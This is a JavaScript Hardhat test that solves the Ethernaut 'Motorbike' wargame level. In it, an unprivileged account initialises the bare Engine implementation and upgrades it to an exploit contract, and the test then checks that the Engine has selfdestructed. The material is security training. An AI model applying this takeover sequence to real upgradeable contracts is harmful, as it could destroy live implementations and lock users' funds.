const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");

describe("Ethernaut - Twenty Five", function () {
  async function deployContracts() {
    const [deployer, user1] = await ethers.getSigners();

    const EthernautTwentyFiveEngine = await ethers.getContractFactory(
      "EthernautTwentyFiveEngine"
    );
    const ethernautTwentyFiveEngine = await EthernautTwentyFiveEngine.deploy();
    await ethernautTwentyFiveEngine.deployed();

    const EthernautTwentyFiveMotorbike = await ethers.getContractFactory(
      "EthernautTwentyFiveMotorbike"
    );
    const ethernautTwentyFiveMotorbike =
      await EthernautTwentyFiveMotorbike.deploy(
        ethernautTwentyFiveEngine.address
      );
    await ethernautTwentyFiveMotorbike.deployed();

    const EthernautTwentyFiveExploit = await ethers.getContractFactory(
      "EthernautTwentyFiveExploit"
    );
    const ethernautTwentyFiveExploit =
      await EthernautTwentyFiveExploit.deploy();
    await ethernautTwentyFiveExploit.deployed();

    return {
      ethernautTwentyFiveEngine,
      ethernautTwentyFiveMotorbike,
      ethernautTwentyFiveExploit,
      deployer,
      user1,
    };
  }

  const contractExists = async (provider, address) => {
    try {
      const code = await provider.getCode(address);
      if (code !== "0x") {
        return true;
      }
      return false;
    } catch (error) {
      return false;
    }
  };

  describe("Exploit", function () {
    it("Selfdestruct successful", async function () {
      const {
        ethernautTwentyFiveEngine,
        ethernautTwentyFiveMotorbike,
        ethernautTwentyFiveExploit,
        deployer,
        user1,
      } = await loadFixture(deployContracts);

      expect(
        await contractExists(
          ethernautTwentyFiveEngine.provider,
          ethernautTwentyFiveEngine.address
        )
      ).to.be.true;

      const ABI = ["function exploit()"];
      const iface = new ethers.utils.Interface(ABI);
      const data = iface.encodeFunctionData("exploit");

      await ethernautTwentyFiveEngine.connect(user1).initialize();
      await ethernautTwentyFiveEngine
        .connect(user1)
        .upgradeToAndCall(ethernautTwentyFiveExploit.address, data);

      expect(
        await contractExists(
          ethernautTwentyFiveEngine.provider,
          ethernautTwentyFiveEngine.address
        )
      ).to.be.false;
    });
  });
});
